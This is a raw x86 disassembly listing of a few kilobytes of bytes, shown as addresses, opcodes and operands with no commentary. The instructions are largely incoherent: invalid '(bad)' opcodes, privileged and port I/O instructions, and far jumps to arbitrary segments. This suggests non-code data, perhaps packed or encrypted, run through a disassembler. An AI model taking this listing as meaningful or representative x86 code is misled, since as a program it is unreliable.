  41683f:	mov    ds:0x26ba7776,eax
  416844:	push   ebx
  416845:	dec    edx
  416846:	mov    eax,ds:0xc74f98f5
  41684b:	sbb    ch,BYTE PTR [eax+0x1a5936d9]
  416851:	or     eax,0xf1bbe62c
  416856:	lods   eax,DWORD PTR ds:[esi]
  416857:	fild   QWORD PTR ds:0xcad05226
  41685d:	mov    cl,0x99
  41685f:	xchg   edx,eax
  416860:	into   
  416861:	into   
  416862:	jmp    0x1480:0x588213e3
  416869:	fxch   st(7)
  41686b:	jle    0x416894
  41686d:	sahf   
  41686e:	jmp    0x36d9:0xb7ac0f50
  416875:	mov    ebp,0x704de032
  41687a:	mov    eax,0xfac7146b
  41687f:	inc    edx
  416880:	mov    ss,WORD PTR [eax]
  416882:	test   eax,0xa13f6dfd
  416887:	xor    edx,edi
  416889:	inc    BYTE PTR [edx+ebp*1+0x38abf278]
  416890:	fmul   st(6),st
  416892:	int3   
  416893:	test   eax,0x44e384d0
  416898:	push   0xf8edfc5f
  41689d:	icebp  
  41689e:	or     dh,0xca
  4168a1:	inc    esi
  4168a2:	fcmovbe st,st(3)
  4168a4:	aaa    
  4168a5:	rol    BYTE PTR [esi+0x69d7ee30],cl
  4168ab:	icebp  
  4168ac:	mov    ss,WORD PTR [ebx-0x156415a2]
  4168b2:	push   edi
  4168b3:	rcr    DWORD PTR [esi+0x28],cl
  4168b6:	sub    edx,edi
  4168b8:	cli    
  4168b9:	push   edi
  4168ba:	aas    
  4168bb:	retf   
  4168bc:	shl    esi,1
  4168be:	cmp    DWORD PTR ss:[ebp+0x44edde14],eax
  4168c5:	out    0x32,eax
  4168c7:	(bad)  
  4168c8:	cs push ebp
  4168ca:	sbb    bl,cl
  4168cc:	out    dx,al
  4168cd:	push   ebx
  4168ce:	iret   
  4168cf:	sub    dl,cl
  4168d1:	jno    0x4168b1
  4168d3:	mov    esi,0xdaec779b
  4168d8:	enter  0x9f4d,0xcb
  4168dc:	inc    esp
  4168dd:	jge    0x41689f
  4168df:	jbe    0x41689b
  4168e1:	push   ds
  4168e2:	ficom  WORD PTR [eax-0x3a04730b]
  4168e8:	retf   0xb88a
  4168eb:	jmp    0x4168fd
  4168ed:	cli    
  4168ee:	mov    eax,ds:0x8cf47ee9
  4168f3:	lea    ebx,[ebx]
  4168f5:	xchg   esp,eax
  4168f6:	ret    
  4168f7:	ins    DWORD PTR es:[edi],dx
  4168f8:	push   edx
  4168f9:	dec    ebp
  4168fa:	aaa    
  4168fb:	sti    
  4168fc:	cmove  ecx,DWORD PTR [esi-0x33]
  416900:	ja     0x4168c1
  416902:	or     eax,0xdbab1ab2
  416907:	sbb    BYTE PTR [eax+0x41],al
  41690a:	mov    eax,ds:0xc319de0b
  41690f:	imul   esi,DWORD PTR [edx],0xf69aa69b
  416915:	adc    esp,ebp
  416917:	xor    DWORD PTR ds:[ebx+0x4e],edi
  41691b:	mov    edi,0x4381fee4
  416920:	mov    ebp,0xc485d7e7
  416925:	test   DWORD PTR [ebx+esi*4],edx
  416928:	xchg   esi,eax
  416929:	sbb    esi,esp
  41692b:	jnp    0x4168d2
  41692d:	sahf   
  41692e:	js     0x4168c5
  416930:	pop    edi
  416931:	sbb    al,0x54
  416933:	pop    ss
  416934:	mov    eax,ds:0x95e30c9a
  416939:	add    al,0xd8
  41693b:	mov    ebx,0x19991d68
  416940:	or     DWORD PTR [ecx+0x7],esp
  416943:	loopne 0x416944
  416945:	push   ecx
  416946:	fsub   st(0),st
  416948:	test   al,0x20
  41694a:	push   ebx
  41694b:	sub    BYTE PTR [edi-0x46c82eb],bl
  416951:	outs   dx,DWORD PTR ds:[esi]
  416952:	xchg   ecx,eax
  416953:	mov    cs,WORD PTR [ebp+edi*1+0xf]
  416957:	fidivr WORD PTR [esp+eax*1-0x41]
  41695b:	outs   dx,DWORD PTR ds:[esi]
  41695c:	jp     0x416931
  41695e:	stos   BYTE PTR es:[edi],al
  41695f:	je     0x416952
  416961:	iret   
  416962:	mov    ds:0xd3771343,eax
  416967:	add    bh,BYTE PTR [edi+0x72]
  41696a:	pop    esi
  41696c:	js     0x41690b
  41696e:	mov    cl,0xb6
  416970:	cld    
  416971:	jns    0x4169c0
  416973:	ins    DWORD PTR es:[edi],dx
  416974:	popf   
  416975:	cmp    eax,0xffcb1579
  41697a:	stos   BYTE PTR es:[edi],al
  41697b:	xor    eax,0xdd953ecc
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	ret    
  416994:	data16 adc BYTE PTR [edx-0x5b],al
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x8770707e
  4169a0:	call   0xc8bfaeb4
  4169a5:	mov    ebx,0xc89e65cc
  4169aa:	es dec edx
  4169ac:	ret    
  4169ad:	lods   eax,DWORD PTR ds:[esi]
  4169ae:	jmp    0x21d9:0xa79e135c
  4169b5:	fwait
  4169b6:	addr16 xor al,0x9f
  4169b9:	add    ebx,esi
  4169bb:	pop    edx
  4169bc:	inc    eax
  4169bd:	aaa    
  4169be:	or     dh,cl
  4169c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169c1:	or     DWORD PTR [ecx+0x123f4d6f],0xffffffec
  4169c8:	fwait
  4169c9:	or     ah,bh
  4169cb:	dec    ebp
  4169cc:	push   edi
  4169cd:	add    edi,DWORD PTR [edx]
  4169cf:	stc    
  4169d0:	aaa    
  4169d1:	pop    ebx
  4169d2:	in     al,dx
  4169d3:	ins    DWORD PTR es:[edi],dx
  4169d4:	retf   0xdaf1
  4169d7:	mov    DWORD PTR [edx-0xc],edx
  4169da:	ret    
  4169db:	cld    
  4169dc:	hlt    
  4169dd:	sub    al,BYTE PTR [eax-0x5f]
  4169e0:	int    0x16
  4169e2:	dec    ecx
  4169e3:	jmp    0x4169bb
  4169e5:	xor    edi,0x934e49eb
  4169eb:	and    BYTE PTR [edx-0x34],bh
  4169ee:	dec    ecx
  4169ef:	inc    esp
  4169f0:	repnz add DWORD PTR fs:[edx],edi
  4169f4:	jbe    0x416987
  4169f6:	ins    BYTE PTR es:[edi],dx
  4169f7:	xlat   BYTE PTR ds:[ebx]
  4169f8:	(bad)  
  4169f9:	push   cs
  4169fa:	push   ds
  4169fb:	jcxz   0x416a61
  4169fe:	sbb    DWORD PTR [eax],ebx
  416a00:	mov    cl,0x1c
  416a02:	ret    0x55d
  416a05:	inc    edi
  416a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a07:	or     dh,dl
  416a09:	adc    ebp,ebp
  416a0b:	jmp    0x62298e0f
  416a10:	mov    al,0xef
  416a12:	mov    al,0x9f
  416a14:	pop    ecx
  416a15:	(bad)  
  416a16:	jmp    0x4169e9
  416a18:	std    
  416a19:	jg     0x41699c
  416a1b:	pop    esi
  416a1c:	ret    0x73d5
  416a1f:	or     eax,0x8dfe8655
  416a24:	in     eax,dx
  416a25:	test   BYTE PTR [ebx+0x0],bh
  416a28:	adc    cl,al
  416a2a:	retf   0x805f
  416a2d:	adc    DWORD PTR [eax+ebx*4+0x49ce53d6],edx
  416a34:	ss dec ebp
  416a36:	mov    esp,0x36b67d63
  416a3b:	or     al,0xd8
  416a3d:	pop    esi
  416a3e:	push   ecx
  416a3f:	in     eax,0x50
  416a41:	es pushf 
  416a43:	xor    dl,cl
  416a45:	xor    al,0x9
  416a47:	(bad)  
  416a48:	std    
  416a49:	dec    ecx
  416a4a:	fwait
  416a4b:	pop    eax
  416a4c:	dec    eax
  416a4d:	scas   al,BYTE PTR es:[edi]
  416a4e:	mov    dh,0x2
  416a50:	outs   dx,BYTE PTR ds:[esi]
  416a51:	mov    dh,0x7f
  416a53:	fnstenv [eax]
  416a55:	enter  0x8c7,0x70
  416a59:	push   ebp
  416a5a:	ret    0xced9
  416a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a5e:	leave  
  416a5f:	test   BYTE PTR [ecx-0x1b3d1070],ch
  416a65:	xchg   BYTE PTR [ebx],dl
  416a67:	xchg   ah,ch
  416a69:	xchg   esp,eax
  416a6a:	mov    dh,0x4e
  416a6c:	pop    ebp
  416a6d:	fld    st(6)
  416a6f:	loop   0x416a5d
  416a71:	mov    edi,DWORD PTR [ebp+eiz*1+0x6d230902]
  416a78:	hlt    
  416a79:	pop    ebp
  416a7a:	mov    bl,0x5c
  416a7c:	sbb    ah,0xa9
  416a7f:	rcr    DWORD PTR [edi+0x47],1
  416a82:	push   ecx
  416a83:	and    ebp,DWORD PTR [ecx+0x77370f9d]
  416a89:	movnti DWORD PTR [ecx],ebp
  416a8c:	sbb    bl,bh
  416a8e:	mov    bh,0xa9
  416a90:	sbb    DWORD PTR [edi-0x1ce770be],esi
  416a96:	iret   
  416a97:	push   edi
  416a98:	mov    eax,cs:0xfbee0b6d
  416a9e:	xchg   ebx,eax
  416a9f:	stos   DWORD PTR es:[edi],eax
  416aa0:	mov    edi,0x39ca533a
  416aa5:	adc    ebp,DWORD PTR [esi+0x3f72ddba]
  416aab:	xchg   ecx,eax
  416aac:	fbld   TBYTE PTR [edi]
  416aae:	shl    BYTE PTR [edi],cl
  416ab0:	fwait
  416ab1:	push   0xffffffcc
  416ab3:	fsubr  DWORD PTR [ebx+eiz*4+0x20]
  416ab7:	push   cs
  416ab8:	test   DWORD PTR [edx+0x59803a1c],0x493da0a3
  416ac2:	test   ecx,0xf6b9a59f
  416ac8:	loope  0x416ad7
  416aca:	or     ebp,ebx
  416acc:	dec    ebx
  416acd:	fcomp  QWORD PTR [ebx]
  416acf:	jp     0x416aa1
  416ad1:	inc    ecx
  416ad2:	in     eax,0xe6
  416ad4:	out    dx,eax
  416ad5:	xlat   BYTE PTR ds:[ebx]
  416ad6:	mov    esp,0xc83763a0
  416adb:	mov    al,ds:0xd9c1b2f7
  416ae0:	outs   dx,DWORD PTR ds:[esi]
  416ae1:	mov    WORD PTR [edx-0x650e5f8f],ss
  416ae7:	das    
  416ae8:	mov    ds:0xca54dcdd,eax
  416aed:	js     0x416a76
  416aef:	pop    esi
  416af0:	push   0xffffff8c
  416af2:	jbe    0x416af3
  416af4:	in     al,0x3e
  416af6:	inc    ebx
  416af7:	das    
  416af8:	pop    es
  416af9:	xor    DWORD PTR [ebp-0x559dc404],eax
  416aff:	push   cs
  416b00:	popa   
  416b01:	mov    esi,0x8c3add2d
  416b06:	ins    BYTE PTR es:[edi],dx
  416b07:	xor    ebx,DWORD PTR [ebp+esi*1-0x42cfab58]
  416b0e:	ja     0x416b13
  416b10:	retf   0x36c5
  416b13:	(bad)  
  416b14:	sti    
  416b15:	dec    eax
  416b16:	sbb    al,0xa1
  416b18:	mov    al,ds:0x1eda5012
  416b1d:	adc    al,0x2e
  416b1f:	xchg   ecx,eax
  416b20:	iret   
  416b21:	shl    esp,1
  416b23:	test   DWORD PTR [ecx],ebp
  416b25:	sbb    ebx,DWORD PTR [edx+eax*2+0x4e0ca0a1]
  416b2c:	shl    BYTE PTR [ebx+edx*8],0x9b
  416b30:	dec    ebx
  416b31:	push   cs
  416b32:	retf   
  416b33:	pusha  
  416b34:	adc    eax,0xad78d57d
  416b39:	fmul   DWORD PTR [edi-0x78]
  416b3c:	scas   al,BYTE PTR es:[edi]
  416b3d:	ror    DWORD PTR ds:0xee4eaf04,0x59
  416b44:	enter  0x3699,0xfc
  416b48:	xchg   BYTE PTR [edi+0x3727f951],al
  416b4e:	xor    DWORD PTR [eax+0x45],ebx
  416b51:	das    
  416b52:	xchg   ebx,eax
  416b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b54:	xchg   ebp,eax
  416b55:	(bad)  
  416b56:	xor    ebp,DWORD PTR [edx+0x41]
  416b59:	push   edx
  416b5a:	out    0xf0,eax
  416b5c:	daa    
  416b5d:	push   eax
  416b5e:	mov    cl,0xb2
  416b60:	or     BYTE PTR [eax-0x647ec1df],ah
  416b66:	adc    al,0xc7
  416b68:	mov    al,ds:0x1aad96a1
  416b6d:	and    al,dh
  416b6f:	mov    edi,0xe2429cb5
  416b74:	outs   dx,DWORD PTR ds:[esi]
  416b75:	js     0x416b1e
  416b77:	scas   eax,DWORD PTR es:[edi]
  416b78:	dec    ebx
  416b79:	and    DWORD PTR [esi-0x7f691a9a],esi
  416b7f:	mov    ah,0x7f
  416b81:	sbb    esi,DWORD PTR [bp+si+0x28]
  416b85:	inc    ebx
  416b86:	lds    eax,FWORD PTR [ebx-0x38]
  416b89:	mov    ds:0xa9b643d4,eax
  416b8e:	sbb    dh,BYTE PTR [esi+0x45]
  416b91:	scas   eax,DWORD PTR es:[edi]
  416b92:	pop    esi
  416b93:	test   BYTE PTR [ebx],al
  416b95:	lahf   
  416b96:	dec    edx
  416b97:	(bad)
  416b9a:	test   al,0xa5
  416b9c:	push   ebx
  416b9d:	imul   esi,DWORD PTR [ebx-0x296f185],0x53047300
  416ba7:	xlat   BYTE PTR ds:[ebx]
  416ba8:	mov    dl,bh
  416baa:	imul   ebp,DWORD PTR [eax+ecx*4-0x55],0xb9ee9efc
  416bb2:	ins    BYTE PTR es:[edi],dx
  416bb3:	push   ecx
  416bb4:	neg    DWORD PTR [eax+0x6a58d75]
  416bba:	inc    ecx
  416bbb:	mov    ebp,0xb073c1b7
  416bc0:	adc    al,0x4b
  416bc2:	test   edx,0x24580c3d
  416bc8:	push   ecx
  416bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bca:	scas   al,BYTE PTR es:[edi]
  416bcb:	push   ss
  416bcc:	stos   DWORD PTR es:[edi],eax
  416bcd:	fbstp  TBYTE PTR [esi]
  416bcf:	jp     0x416b89
  416bd1:	pop    esp
  416bd2:	mov    esp,0xeefbfd63
  416bd7:	aam    0xf1
  416bd9:	sti    
  416bda:	push   esi
  416bdb:	fild   WORD PTR [ecx-0x415524]
  416be1:	xchg   esp,eax
  416be2:	cdq    
  416be3:	mov    ecx,0xccc420d9
  416be8:	shl    BYTE PTR [esi],0x1a
  416beb:	test   BYTE PTR [edi],bh
  416bed:	dec    edi
  416bee:	aaa    
  416bef:	fidiv  WORD PTR [ecx-0x6a2c2a80]
  416bf5:	adc    bh,BYTE PTR [edx-0x5a50bb0a]
  416bfb:	jge    0x416c24
  416bfd:	mov    ch,0xa5
  416bff:	rcl    DWORD PTR [edi+eax*2],0xc6
  416c03:	ss stos DWORD PTR es:[edi],eax
  416c05:	sbb    al,0xc4
  416c07:	push   edx
  416c08:	addr16 (bad) 
  416c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c0b:	pusha  
  416c0c:	or     eax,0x375b32af
  416c11:	sbb    edx,esi
  416c13:	push   ss
  416c14:	inc    ebp
  416c15:	es jge 0x416bc4
  416c18:	push   es
  416c19:	add    edi,DWORD PTR [esi+0x27eee33f]
  416c1f:	les    esi,FWORD PTR [esi]
  416c21:	int    0x8a
  416c23:	inc    eax
  416c24:	neg    BYTE PTR [eax]
  416c26:	retf   0x3100
  416c29:	cmp    dl,BYTE PTR [edi-0x2b]
  416c2c:	ror    BYTE PTR [edx],cl
  416c2e:	sub    esp,DWORD PTR ss:[ecx]
  416c31:	dec    eax
  416c32:	arpl   WORD PTR [ebp+0x12],bx
  416c35:	shr    DWORD PTR [ebx],cl
  416c37:	xchg   ebx,eax
  416c38:	cmp    al,0xc9
  416c3a:	jb     0x416ca1
  416c3c:	inc    edx
  416c3d:	cld    
  416c3e:	rol    BYTE PTR [edi],1
  416c40:	in     al,dx
  416c41:	inc    esp
  416c42:	sti    
  416c43:	push   eax
  416c44:	jl     0x416cb8
  416c46:	cmp    eax,0xbe4cdc05
  416c4b:	pop    ds
  416c4c:	sbb    ebp,ebx
  416c4e:	push   eax
  416c4f:	stc    
  416c50:	adc    esi,edi
  416c52:	test   al,0x8f
  416c54:	and    edi,DWORD PTR [edi+edi*4]
  416c57:	dec    ebp
  416c58:	nop
  416c59:	je     0x416be3
  416c5b:	dec    ecx
  416c5c:	and    BYTE PTR [ecx+0x56],0xb
  416c60:	jno    0x416c0b
  416c62:	dec    ebx
  416c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c64:	push   esp
  416c65:	call   0xdfe9:0xe4458b49
  416c6c:	add    al,BYTE PTR [eax]
  416c6e:	add    BYTE PTR [esi+0x3e],ch
  416c71:	push   eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	or     ch,bh
  416c7d:	push   es
  416c7e:	adc    eax,0x707f1cee
  416c83:	mov    ecx,0x3a70707e
  416c88:	mov    ds:0x943281c9,al
  416c8d:	sbb    dl,BYTE PTR [edx]
  416c8f:	mov    al,0x8
  416c91:	jns    0x416cad
  416c93:	push   ss
  416c94:	dec    esp
  416c95:	mov    eax,ds:0xb740fdb0
  416c9a:	pop    esp
  416c9b:	jb     0x416c32
  416c9d:	iret   
  416c9e:	(bad)  
  416c9f:	cmp    al,0xf2
  416ca1:	sub    DWORD PTR ds:0xa34a652a,esi
  416ca7:	cli    
  416ca8:	cmp    BYTE PTR [ecx+0x45],dh
  416cab:	cmp    DWORD PTR [edi+0x53],ebx
  416cae:	popf   
  416caf:	xor    BYTE PTR [ecx],bh
  416cb1:	push   ss
  416cb2:	mov    bl,0x1
  416cb4:	into   
  416cb5:	ds (bad) 
  416cb7:	jecxz  0x416cdb
  416cb9:	lods   al,BYTE PTR ds:[esi]
  416cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cbb:	cdq    
  416cbc:	cli    
  416cbd:	xor    BYTE PTR [ecx-0x641532e5],dh
  416cc3:	push   0x70
  416cc5:	repnz ins DWORD PTR es:[edi],dx
  416cc7:	cwde   
  416cc8:	xlat   BYTE PTR ds:[ebx]
  416cc9:	cmp    ebx,ebx
  416ccb:	fst    QWORD PTR [edi+edi*2-0x36]
  416ccf:	inc    ecx
  416cd0:	mov    ds:0x9477d22f,al
  416cd5:	in     al,dx
  416cd6:	nop
  416cd7:	stc    
  416cd8:	mov    DWORD PTR gs:[eax],edx
  416cdb:	test   DWORD PTR [edx-0x76],0xd88cf823
  416ce2:	push   ebx
  416ce3:	daa    
  416ce4:	inc    eax
  416ce5:	or     eax,0x6063d28f
  416cea:	jle    0x416c6d
  416cec:	xchg   ebp,eax
  416ced:	cmp    al,0xc6
  416cef:	ja     0x416d26
  416cf1:	stc    
  416cf2:	sub    eax,0xad3c55b8
  416cf7:	cld    
  416cf8:	jo     0x416cde
  416cfa:	loope  0x416c88
  416cfc:	or     ebp,DWORD PTR [ebx]
  416cfe:	jmp    0x50be:0xb6093ab0
  416d05:	cld    
  416d06:	push   edx
  416d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d08:	dec    ebp
  416d09:	popf   
  416d0a:	(bad)  [edx]
  416d0c:	retf   
  416d0d:	es es js 0x416d47
  416d11:	mov    ebx,cs
  416d13:	jbe    0x416c98
  416d15:	fisubr WORD PTR [ebx]
  416d17:	out    0xbe,eax
  416d19:	push   0xffffffd7
  416d1b:	pop    edi
  416d1c:	dec    eax
  416d1d:	xor    esi,DWORD PTR ds:0xe2316ad9
  416d23:	loopne 0x416d1e
  416d25:	imul   ecx,edi,0xffffffb2
  416d28:	add    ecx,DWORD PTR [ecx-0x67d33c95]
  416d2e:	push   ebp
  416d2f:	clc    
  416d30:	out    dx,al
  416d31:	add    ebx,DWORD PTR [eax]
  416d33:	adc    DWORD PTR cs:[edx+0x7b47b868],ebx
  416d3a:	je     0x416cec
  416d3c:	test   ah,0xde
  416d3f:	jge    0x416d2e
  416d41:	js     0x416ccb
  416d43:	sub    DWORD PTR [edx],edi
  416d45:	pop    esp
  416d46:	jg     0x416d2c
  416d48:	sahf   
  416d49:	push   0xe544be19
  416d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d4f:	jle    0x416d54
  416d51:	iret   
  416d52:	push   edx
  416d53:	push   edi
  416d54:	dec    ecx
  416d55:	mov    ds:0x9715b0b5,eax
  416d5a:	das    
  416d5b:	mov    DWORD PTR [ebx],esp
  416d5d:	jns    0x416d5d
  416d5f:	into   
  416d60:	and    eax,0x58ba1088
  416d65:	adc    dl,BYTE PTR [edx]
  416d67:	(bad)  
  416d69:	push   edx
  416d6a:	xor    BYTE PTR [eax+0x38],ch
  416d6d:	call   0xb179:0x73b52762
  416d74:	dec    ecx
  416d75:	cmp    al,0xf
  416d77:	inc    ebp
  416d78:	daa    
  416d79:	daa    
  416d7a:	scas   eax,DWORD PTR es:[edi]
  416d7b:	mov    al,0x94
  416d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d7e:	loope  0x416d66
  416d80:	fidivr DWORD PTR [edx+0x1f]
  416d83:	dec    edx
  416d84:	daa    
  416d85:	js     0x416dc7
  416d87:	leave  
  416d88:	xlat   BYTE PTR ds:[ebx]
  416d89:	cld    
  416d8a:	push   ecx
  416d8b:	bound  ebx,QWORD PTR [eax]
  416d8d:	and    ebp,DWORD PTR [ebx+0xe]
  416d90:	loop   0x416d34
  416d92:	imul   esi,DWORD PTR [ecx-0x62e939c],0x6afa303
  416d9c:	retf   
  416d9d:	aas    
  416d9e:	pop    eax
  416d9f:	pop    eax
  416da0:	mov    ecx,0xef1e99c3
  416da5:	mov    ebx,0x40f7a3e9
  416daa:	enter  0x9a5c,0x73
  416dae:	xor    DWORD PTR [edi-0x23a0042d],eax
  416db4:	jns    0x416d56
  416db6:	imul   esi,esi,0xffffff92
  416db9:	rcr    BYTE PTR [edx],1
  416dbb:	adc    eax,DWORD PTR [ebp+0x2]
  416dbe:	mov    DWORD PTR [esi],ebx
  416dc0:	mov    ecx,0xbc197b0e
  416dc5:	daa    
  416dc6:	out    0xc0,eax
  416dc8:	mov    esp,0x3971bffc
  416dcd:	mov    ecx,0x9d0d2429
  416dd2:	fidivr WORD PTR [edx+esi*2+0x2e6598b9]
  416dd9:	xchg   ecx,eax
  416dda:	lods   al,BYTE PTR ds:[esi]
  416ddb:	rcr    BYTE PTR ds:0xc5af170a,1
  416de1:	or     edx,DWORD PTR es:[eax+0x54125fe4]
  416de8:	rcl    DWORD PTR [esi],cl
  416dea:	xor    DWORD PTR ds:0x638d4bd2,edi
  416df0:	je     0x416d72
  416df2:	hlt    
  416df3:	xchg   ebp,eax
  416df4:	mov    esp,DWORD PTR [ebx]
  416df6:	pop    esi
  416df7:	ins    BYTE PTR es:[edi],dx
  416df8:	test   eax,0x1ecbf71b
  416dfd:	and    al,0xfa
  416dff:	xor    BYTE PTR ds:0xfa736fd5,0xbe
  416e06:	jns    0x416d95
  416e08:	cmp    al,0x8d
  416e0a:	gs adc al,0x3b
  416e0d:	jb     0x416e70
  416e0f:	and    BYTE PTR [ebx],bl
  416e11:	enter  0x1ada,0x7b
  416e15:	mov    WORD PTR [edx+0x77],ss
  416e18:	and    ebx,DWORD PTR [edx]
  416e1a:	sub    bl,dl
  416e1c:	loopne 0x416e8a
  416e1e:	lahf   
  416e1f:	cmp    edi,DWORD PTR [edx]
  416e21:	sub    esi,eax
  416e23:	pop    edi
  416e24:	sbb    esi,0x3c
  416e27:	pop    ds
  416e28:	loopne 0x416e3b
  416e2a:	add    edi,DWORD PTR [ebp+0x3d]
  416e2d:	pusha  
  416e2e:	push   es
  416e2f:	and    eax,0x387f277a
  416e34:	jge    0x416e3f
  416e36:	mov    eax,ds:0xdffa1d0b
  416e3b:	add    DWORD PTR [edx],ebx
  416e3d:	push   cs
  416e3e:	shl    BYTE PTR [esi+edx*1],1
  416e41:	push   edi
  416e42:	mov    ch,0x51
  416e44:	outs   dx,DWORD PTR ds:[esi]
  416e45:	jo     0x416ded
  416e47:	outs   dx,DWORD PTR ds:[esi]
  416e48:	sbb    al,BYTE PTR [edi+0x3702a4dd]
  416e4e:	inc    ebx
  416e4f:	mov    edi,0xb9dde394
  416e54:	sbb    al,0xfd
  416e56:	mov    es,WORD PTR cs:[edx-0x74]
  416e5a:	inc    edx
  416e5b:	sbb    al,0xf8
  416e5d:	inc    edi
  416e5e:	aam    0x7c
  416e60:	jne    0x416e40
  416e62:	mov    al,0xd1
  416e64:	cli    
  416e65:	adc    ebp,edi
  416e67:	outs   dx,BYTE PTR ds:[esi]
  416e68:	not    edi
  416e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e6b:	loop   0x416e56
  416e6d:	adc    BYTE PTR [edi],0x5d
  416e70:	and    eax,0xa83a6116
  416e75:	xor    dh,BYTE PTR [edx+edx*2+0x32]
  416e79:	jno    0x416eaf
  416e7b:	es cmp al,0x4a
  416e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e7f:	jne    0x416e7d
  416e81:	jmp    0x6f51:0xf3691551
  416e88:	call   0xe357:0x1a411d5f
  416e8f:	test   BYTE PTR [eax],bl
  416e91:	out    dx,al
  416e92:	or     al,0x42
  416e94:	and    eax,esi
  416e96:	bound  ebx,QWORD PTR [eax-0x7a]
  416e99:	mov    eax,ds:0xfd9f47ae
  416e9e:	cdq    
  416e9f:	mov    eax,ds:0xa367911d
  416ea4:	dec    ebx
  416ea5:	icebp  
  416ea6:	bound  esi,QWORD PTR [ebp+0x21bc760d]
  416eac:	(bad)  
  416ead:	daa    
  416eae:	jb     0x416e71
  416eb0:	out    dx,al
  416eb1:	jmp    0x416ed1
  416eb3:	xchg   dh,al
  416eb5:	mov    bh,BYTE PTR [ebx]
  416eb7:	dec    edx
  416eb8:	mov    bh,0x19
  416eba:	adc    cl,BYTE PTR [edx-0xf]
  416ebd:	mov    eax,ds:0x8bb18394
  416ec2:	sbb    DWORD PTR [esi+esi*8],ebx
  416ec5:	out    dx,al
  416ec6:	xlat   BYTE PTR ds:[ebx]
  416ec7:	pop    ss
  416ec8:	data16 adc ch,BYTE PTR [ecx]
  416ecb:	mov    edx,edx
  416ecd:	mov    bl,0xca
  416ecf:	pop    bp
  416ed1:	rcl    BYTE PTR [edi+0x75226e3e],0xbe
  416ed8:	fmulp  st(2),st
  416eda:	jb     0x416ef6
  416edc:	cmc    
  416edd:	xchg   esi,eax
  416ede:	aam    0x11
  416ee0:	or     al,0xa0
  416ee2:	rcr    BYTE PTR [ebx+0x37f59317],0xe7
  416ee9:	xchg   ecx,eax
  416eea:	fsub   DWORD PTR ds:0xf7958c34
  416ef0:	push   ebp
  416ef1:	popa   
  416ef2:	mov    eax,ds:0xd3657087
  416ef7:	adc    eax,0xec01e34e
  416efc:	jbe    0x416edb
  416efe:	lods   al,BYTE PTR ds:[esi]
  416eff:	jmp    0x416ecf
  416f01:	ret    0x5a20
  416f04:	mov    eax,ds:0xdfd1e829
  416f09:	in     eax,dx
  416f0a:	push   es
  416f0b:	(bad)  
  416f0d:	enter  0xa05c,0xf8
  416f11:	(bad)  
  416f13:	in     eax,0x5e
  416f15:	rol    BYTE PTR [eax+eiz*2+0x2c2569f2],cl
  416f1c:	or     cl,BYTE PTR [ebx+eax*2]
  416f1f:	xchg   BYTE PTR [eax-0xd],cl
  416f22:	das    
  416f23:	push   ecx
  416f24:	or     DWORD PTR [edi],edx
  416f26:	clc    
  416f27:	pop    ss
  416f28:	inc    eax
  416f29:	mov    al,ds:0x50fc1745
  416f2e:	js     0x416ec1
  416f30:	stos   DWORD PTR es:[edi],eax
  416f31:	or     BYTE PTR gs:[edi-0x27],0x6f
  416f36:	fidiv  DWORD PTR [edi+0x214cc8da]
  416f3c:	and    edi,DWORD PTR [edi+0x4d86ea16]
  416f42:	retf   0xc597
  416f45:	adc    BYTE PTR [ecx],0xa2
  416f48:	sti    
  416f49:	jl     0x416f60
  416f4b:	adc    esp,DWORD PTR [ebp-0x3e50f003]
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	pusha  
  416f6b:	push   ebp
  416f6c:	sub    al,0xd6
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xf170707e
  416f77:	lds    esi,FWORD PTR [eax]
  416f79:	fidivr WORD PTR [edx-0x777fa9ce]
  416f7f:	repnz fcom DWORD PTR [eax]
  416f82:	fidiv  DWORD PTR [eax-0x3]
  416f85:	stos   BYTE PTR es:[edi],al
  416f86:	in     al,dx
  416f87:	bound  edx,QWORD PTR [ecx]
  416f89:	xchg   BYTE PTR [esp+edi*2],dl
  416f8c:	push   esp
  416f8d:	pop    eax
  416f8e:	scas   al,BYTE PTR es:[edi]
  416f8f:	mov    eax,0x936586db
  416f94:	sbb    eax,0xe6ba6fad
  416f99:	inc    edx
  416f9a:	jmp    0xa7c:0x96787f92
  416fa1:	dec    edx
  416fa2:	cmp    esp,DWORD PTR [ebp+0x3e]
  416fa5:	stc    
  416fa6:	(bad)  
  416fa7:	add    DWORD PTR fs:[ecx+0xf1381e8],0x66
  416faf:	(bad)  
  416fb0:	rcr    bh,0x6a
  416fb3:	mov    ah,0xa9
  416fb5:	mov    bl,0x5
  416fb7:	wrmsr  
  416fb9:	xchg   DWORD PTR [edx-0x7b],ebp
  416fbc:	int3   
  416fbd:	or     BYTE PTR [ecx-0x5fe48e88],ah
  416fc3:	mov    al,ds:0xc6e435ad
  416fc8:	inc    ecx
  416fc9:	mov    eax,0x1c2ddf76
